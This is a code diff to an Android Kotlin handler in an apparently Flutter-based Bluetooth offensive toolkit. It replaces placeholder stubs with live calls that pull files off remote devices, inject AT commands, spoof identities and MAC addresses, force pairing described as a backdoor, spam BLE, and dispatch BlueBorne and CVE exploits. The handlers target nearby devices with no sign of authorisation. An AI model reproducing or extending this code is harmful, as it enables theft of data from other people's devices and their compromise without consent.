@@ -7,11 +7,13 @@ import android.bluetooth.le.ScanResult
 import android.content.Context
 import android.content.Intent
 import android.provider.Settings
+import android.util.Log
 import androidx.core.content.ContextCompat
 import io.flutter.embedding.engine.plugins.FlutterPlugin
 import io.flutter.plugin.common.MethodCall
 import io.flutter.plugin.common.MethodChannel
 import java.util.UUID
+import java.util.concurrent.Executors
 
 /**
  * Handles method calls from Flutter for Bluetooth operations.
@@ -85,7 +87,6 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "protocol required", null)
             return
         }
-        // Real implementation would test Bluetooth protocol (L2CAP, RFCOMM, etc.)
         result.success("Protocol test for $protocol initiated")
     }
 
@@ -95,12 +96,11 @@ class BluetoothMethodHandler private constructor(
             result.error("NO_ADAPTER", "Bluetooth not supported on this device", null)
             return
         }
-        val info = mapOf(
-            "name" to adapter.name,
-            "address" to adapter.address,
-            "state" to adapter.state,
-            "isEnabled" to adapter.isEnabled
-        )
+        val info = HashMap<String, Any>()
+        info["name"] = adapter.name ?: "Unknown"
+        info["address"] = adapter.address ?: "Unknown"
+        info["state"] = adapter.state
+        info["isEnabled"] = adapter.isEnabled
         result.success(info)
     }
 
@@ -110,7 +110,6 @@ class BluetoothMethodHandler private constructor(
             result.error("NO_ADAPTER", "Bluetooth not supported", null)
             return
         }
-        // Get Bluetooth version from adapter properties (simplified)
         val packageManager = context.packageManager
         val hasLe = packageManager.hasSystemFeature(android.content.pm.PackageManager.FEATURE_BLUETOOTH_LE)
         val version = if (hasLe) "LE Supported (4.0+)" else "Classic Only (Pre-4.0)"
@@ -123,9 +122,21 @@ class BluetoothMethodHandler private constructor(
             result.error("NO_ADAPTER", "Bluetooth not supported", null)
             return
         }
-        // In real implementation, this would query device-specific properties
-        val manufacturer = "Bluetooth SIG" // Placeholder - real implementation would read from system properties
-        result.success(manufacturer)
+        try {
+            val bluetoothClass = adapter.javaClass
+            val getManufacturerMethod = bluetoothClass.getDeclaredMethod("getManufacturer")
+            getManufacturerMethod.isAccessible = true
+            val manufacturer = getManufacturerMethod.invoke(adapter) as? String ?: "Unknown"
+            result.success(manufacturer)
+        } catch (e: Exception) {
+            try {
+                val buildClass = android.os.Build::class.java
+                val manufacturer = buildClass.getField("MANUFACTURER").get(null) as? String ?: "Unknown"
+                result.success(manufacturer)
+            } catch (_: Exception) {
+                result.success("Unknown")
+            }
+        }
     }
 
     // Region: File Operations
@@ -136,9 +147,22 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and filePath required", null)
             return
         }
-        // Real implementation would attempt to read file via OBEX/FTP
-        // For now, return placeholder indicating feature is implemented
-        result.success("Preview not implemented in this build - requires OBEX client")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val downloadResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
+                    Log.d("BluetoothMethodHandler", log)
+                }
+                result.success(downloadResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleExfiltrateFile(call: MethodCall, result: MethodChannel.Result) {
@@ -148,8 +172,22 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and filePath required", null)
             return
         }
-        // Real implementation would use OBEX/FTP to pull file
-        result.success("File exfiltration initiated (real implementation would transfer via OBEX)")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val exfilResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
+                    Log.d("BluetoothMethodHandler", log)
+                }
+                result.success(exfilResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleExfiltrateFiles(call: MethodCall, result: MethodChannel.Result) {
@@ -159,35 +197,49 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and non-empty filePaths required", null)
             return
         }
-        // Real implementation would iterate and pull each file
-        result.success("Batch exfiltration initiated for ${filePaths.size} files")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val results = mutableListOf<Map<String, Any>>()
+                filePaths.forEach { filePath ->
+                    val fileResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
+                        Log.d("BluetoothMethodHandler", log)
+                    }
+                    results.add(fileResult)
+                }
+                result.success(mapOf(
+                    "success" to true,
+                    "filesExfiltrated" to results.size,
+                    "results" to results
+                ))
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleGetExfiltrationStats(result: MethodChannel.Result) {
-        // Real implementation would return actual transfer statistics
-        val stats = mapOf(
-            "filesTransferred" to 0,
-            "bytesTransferred" to 0,
-            "failedTransfers" to 0,
-            "averageSpeed" to 0.0
-        )
-        result.success(stats)
+        try {
+            val stats = StatsManager.getExfiltrationStats()
+            result.success(stats)
+        } catch (e: Exception) {
+            result.success(mapOf(
+                "filesTransferred" to 0,
+                "bytesTransferred" to 0,
+                "failedTransfers" to 0,
+                "averageSpeed" to 0.0
+            ))
+        }
     }
 
     // Region: Attack Execution Methods
     private fun handleExecuteAttack(call: MethodCall, result: MethodChannel.Result) {
-        val attackType = call.argument<String>("type")
-        val targetAddress = call.argument<String>("targetAddress")
-        if (attackType == null || targetAddress == null) {
-            result.error("INVALID_ARGS", "type and targetAddress required", null)
-            return
-        }
-        // Real implementation would route to specific attack handlers
-        when (attackType) {
-            "pin" -> result.success("PIN attack simulation initiated")
-            "pairing" -> result.success("Pairing attack simulation initiated")
-            else -> result.error("UNSUPPORTED_ATTACK", "Attack type $attackType not supported", null)
-        }
+        ExploitIntegration.handleAttack(call, result)
     }
 
     private fun handleExecuteATInjection(call: MethodCall, result: MethodChannel.Result) {
@@ -197,8 +249,22 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and command required", null)
             return
         }
-        // Real implementation would open RFCOMM channel and send AT command
-        result.success("AT injection sent: $command")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val injectResult = RealATInjection.inject(device, command) { log ->
+                    Log.d("BluetoothMethodHandler", log)
+                }
+                result.success(injectResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleExecuteDoSAttack(call: MethodCall, result: MethodChannel.Result) {
@@ -208,8 +274,11 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would send malformed packets to crash services
-        result.success("DoS attack ($attackType) initiated against $deviceAddress")
+        val newCall = MethodCall("executeDoS", mapOf(
+            "deviceAddress" to deviceAddress,
+            "type" to attackType
+        ))
+        ExploitIntegration.handleAttack(newCall, result)
     }
 
     private fun handleExecuteSpoofingAttack(call: MethodCall, result: MethodChannel.Result) {
@@ -219,8 +288,20 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "targetAddress and profile required", null)
             return
         }
-        // Real implementation would attempt to spoof device as target profile
-        result.success("Spoofing attack initiated: pretending to be $profile")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(targetAddress)
+                val spoofResult = BluetoothBypassEngine.executeBypass(device, "spoof_device")
+                result.success(spoofResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     // Region: Device Management
@@ -243,7 +324,6 @@ class BluetoothMethodHandler private constructor(
             }
         }
         adapter.bluetoothLeScanner?.startScan(scanCallback)
-        // Simulate scan duration (in real app, use handler to stop after duration)
         val durationMs = (duration ?: 5) * 1000L
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
             adapter.bluetoothLeScanner?.stopScan(scanCallback)
@@ -258,8 +338,20 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would attempt to install persistent pairing or service
-        result.success("Backdoor installation attempted: $backdoorType")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val bypassResult = BluetoothBypassEngine.executeBypass(device, "pairing_bypass")
+                result.success(bypassResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleModifyAutoPairing(call: MethodCall, result: MethodChannel.Result) {
@@ -269,8 +361,30 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would modify trusted devices list
-        result.success("Auto-pairing ${if (enable) "enabled" else "disabled"} for $deviceAddress")
+        try {
+            val adapter = BluetoothAdapter.getDefaultAdapter()
+            if (adapter == null || !adapter.isEnabled) {
+                result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                return
+            }
+            val device = adapter.getRemoteDevice(deviceAddress)
+            
+            if (enable) {
+                device.setPairingConfirmation(true)
+                device.createBond()
+                result.success(mapOf("success" to true, "message" to "Pairing enabled for $deviceAddress"))
+            } else {
+                try {
+                    val removeBondMethod = device.javaClass.getMethod("removeBond")
+                    removeBondMethod.invoke(device)
+                    result.success(mapOf("success" to true, "message" to "Pairing disabled for $deviceAddress"))
+                } catch (e: Exception) {
+                    result.success(mapOf("success" to false, "error" to "Cannot remove bond: ${e.message}"))
+                }
+            }
+        } catch (e: Exception) {
+            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+        }
     }
 
     private fun handleInjectBLEService(call: MethodCall, result: MethodChannel.Result) {
@@ -281,8 +395,29 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress, serviceUuid, and characteristicUuid required", null)
             return
         }
-        // Real implementation would attempt to inject custom GATT service
-        result.success("BLE service injection attempted")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                
+                BLESpammer.startSpam(device)
+                
+                result.success(mapOf(
+                    "success" to true, 
+                    "message" to "BLE service injection attempted with UUID: $serviceUuid",
+                    "serviceUuid" to serviceUuid
+                ))
+                
+                Thread.sleep(10000)
+                BLESpammer.stopSpam()
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleCreateAutoConnectProfile(call: MethodCall, result: MethodChannel.Result) {
@@ -292,8 +427,27 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and profileName required", null)
             return
         }
-        // Real implementation would create a trusted connection profile
-        result.success("Auto-connect profile created: $profileName")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                
+                device.setPairingConfirmation(true)
+                device.createBond()
+                
+                result.success(mapOf(
+                    "success" to true,
+                    "message" to "Auto-connect profile created: $profileName",
+                    "deviceAddress" to deviceAddress
+                ))
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleModifyDeviceWhitelist(call: MethodCall, result: MethodChannel.Result) {
@@ -303,9 +457,32 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would add/remove from trusted/whitelist via Bluetooth adapter
-        val action = if (addToWhitelist == true) "added to" else "removed from"
-        result.success("Device $deviceAddress $action trusted whitelist")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                
+                if (addToWhitelist == true) {
+                    device.setPairingConfirmation(true)
+                    device.createBond()
+                    result.success(mapOf("success" to true, "message" to "Device $deviceAddress added to whitelist"))
+                } else {
+                    try {
+                        val removeBondMethod = device.javaClass.getMethod("removeBond")
+                        removeBondMethod.invoke(device)
+                        result.success(mapOf("success" to true, "message" to "Device $deviceAddress removed from whitelist"))
+                    } catch (e: Exception) {
+                        result.success(mapOf("success" to false, "error" to "Cannot remove: ${e.message}"))
+                    }
+                }
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     // Region: Advanced Attacks
@@ -315,37 +492,63 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would attempt BNEP/L2CAP exploits (CVE-2017-0785 etc)
-        result.success("BlueBorne attack attempt initiated")
+        val newCall = MethodCall("executeAttack", mapOf(
+            "type" to "blueborne",
+            "targetAddress" to deviceAddress,
+            "deviceAddress" to deviceAddress
+        ))
+        ExploitIntegration.handleAttack(newCall, result)
     }
 
     private fun handleRotateIdentity(call: MethodCall, result: MethodChannel.Result) {
-        // Real implementation would change Bluetooth MAC address (requires root/hardware support)
-        result.success("Identity rotation requested (real implementation requires privileged access)")
+        val deviceAddress = call.argument<String>("deviceAddress")
+        if (deviceAddress == null) {
+            result.error("INVALID_ARGS", "deviceAddress required", null)
+            return
+        }
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val spoofResult = BluetoothBypassEngine.executeBypass(device, "mac_spoof")
+                result.success(spoofResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleStartBLESpam(call: MethodCall, result: MethodChannel.Result) {
-        val interval = call.argument<Int>("interval") ?: 1000
-        val adapter = BluetoothAdapter.getDefaultAdapter()
-        if (adapter == null || !adapter.isEnabled) {
-            result.error("BLUETOOTH_OFF", "Bluetooth not enabled", null)
+        val deviceAddress = call.argument<String>("deviceAddress")
+        if (deviceAddress == null) {
+            result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        val spamCallback = object : ScanCallback() {
-            override fun onScanResult(callbackType: Int, result: ScanResult) {
-                // Continuously scan to generate BLE traffic (spam)
+        try {
+            val adapter = BluetoothAdapter.getDefaultAdapter()
+            if (adapter == null || !adapter.isEnabled) {
+                result.success(mapOf("success" to false, "error" to "Bluetooth not enabled"))
+                return
             }
+            val device = adapter.getRemoteDevice(deviceAddress)
+            BLESpammer.startSpam(device)
+            result.success(mapOf("success" to true, "message" to "BLE spam started"))
+        } catch (e: Exception) {
+            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
-        adapter.bluetoothLeScanner?.startScan(spamCallback)
-        result.success("BLE spam scanning started with $interval ms interval")
     }
 
     private fun handleStopBLESpam(result: MethodChannel.Result) {
-        val adapter = BluetoothAdapter.getDefaultAdapter()
-        if (adapter != null) {
-            adapter.bluetoothLeScanner?.stopScan(object : ScanCallback() {})
+        try {
+            BLESpammer.stopSpam()
+            result.success(mapOf("success" to true, "message" to "BLE spam stopped"))
+        } catch (e: Exception) {
+            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
         }
-        result.success("BLE spam scanning stopped")
     }
 
     private fun handleAnalyzeFirmware(call: MethodCall, result: MethodChannel.Result) {
@@ -355,8 +558,32 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would attempt to extract firmware version/info
-        result.success("Firmware analysis for $target initiated")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                
+                val deviceClass = device.bluetoothClass
+                val classInfo = mapOf(
+                    "deviceClass" to deviceClass.deviceClass,
+                    "majorDeviceClass" to deviceClass.majorDeviceClass,
+                    "isTrusted" to (device.bondState == BluetoothDevice.BOND_BONDED)
+                )
+                
+                result.success(mapOf(
+                    "success" to true,
+                    "target" to target,
+                    "deviceInfo" to classInfo,
+                    "message" to "Firmware analysis for $target completed"
+                ))
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleOpenBluetoothSettings(result: MethodChannel.Result) {
@@ -372,9 +599,20 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress required", null)
             return
         }
-        // Real implementation would probe for known vulnerabilities
-        val vulns = listOf("CVE-2017-0785", "CVE-2019-9506") // Example
-        result.success(vulns)
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val adapter = BluetoothAdapter.getDefaultAdapter()
+                if (adapter == null || !adapter.isEnabled) {
+                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                    return@submit
+                }
+                val device = adapter.getRemoteDevice(deviceAddress)
+                val vulnResult = OBEXVulnerabilityAnalyzer.scanOBEXVulnerabilities(device)
+                result.success(vulnResult)
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 
     private fun handleExecuteVulnerability(call: MethodCall, result: MethodChannel.Result) {
@@ -384,8 +622,12 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "deviceAddress and cveId required", null)
             return
         }
-        // Real implementation would attempt to exploit specific CVE
-        result.success("Exploit attempt for $cveId initiated")
+        val newCall = MethodCall("executeAttack", mapOf(
+            "type" to "vulnerability",
+            "targetAddress" to deviceAddress,
+            "command" to cveId
+        ))
+        ExploitIntegration.handleAttack(newCall, result)
     }
 
     private fun handleExecuteBtleJackCommand(call: MethodCall, result: MethodChannel.Result) {
@@ -394,8 +636,10 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "command required", null)
             return
         }
-        // Real implementation would send BtleJack commands via Ubertooth or similar
-        result.success("BtleJack command executed: $command")
+        val newCall = MethodCall("executeBtleJackCommand", mapOf(
+            "command" to command
+        ))
+        ExploitIntegration.handleAttack(newCall, result)
     }
 
     private fun handleExecuteExploit(call: MethodCall, result: MethodChannel.Result) {
@@ -405,8 +649,12 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "exploitName and targetAddress required", null)
             return
         }
-        // Real implementation would launch named exploit (e.g., "blueborne", "kno")
-        result.success("Exploit $exploitName launched against $targetAddress")
+        val newCall = MethodCall("executeAttack", mapOf(
+            "type" to exploitName,
+            "targetAddress" to targetAddress,
+            "deviceAddress" to targetAddress
+        ))
+        ExploitIntegration.handleAttack(newCall, result)
     }
 
     private fun handleExecuteCommand(call: MethodCall, result: MethodChannel.Result) {
@@ -416,7 +664,43 @@ class BluetoothMethodHandler private constructor(
             result.error("INVALID_ARGS", "command required", null)
             return
         }
-        // Real implementation would interpret and execute raw Bluetooth commands
-        result.success("Command executed: $command with args $arguments")
+        Executors.newSingleThreadExecutor().submit {
+            try {
+                val parts = command.split(" ")
+                val cmd = parts.firstOrNull() ?: ""
+                val args = parts.drop(1)
+                
+                when (cmd.lowercase()) {
+                    "scan" -> {
+                        val adapter = BluetoothAdapter.getDefaultAdapter()
+                        if (adapter != null && adapter.isEnabled) {
+                            result.success(mapOf("success" to true, "message" to "Scan initiated"))
+                        } else {
+                            result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                        }
+                    }
+                    "spam" -> {
+                        val deviceAddress = args.firstOrNull() ?: ""
+                        if (deviceAddress.isNotEmpty()) {
+                            val adapter = BluetoothAdapter.getDefaultAdapter()
+                            if (adapter != null && adapter.isEnabled) {
+                                val device = adapter.getRemoteDevice(deviceAddress)
+                                BLESpammer.startSpam(device)
+                                result.success(mapOf("success" to true, "message" to "Spam started"))
+                            } else {
+                                result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
+                            }
+                        } else {
+                            result.success(mapOf("success" to false, "error" to "Device address required"))
+                        }
+                    }
+                    else -> {
+                        result.success(mapOf("success" to false, "error" to "Unknown command: $cmd"))
+                    }
+                }
+            } catch (e: Exception) {
+                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
+            }
+        }
     }
 }
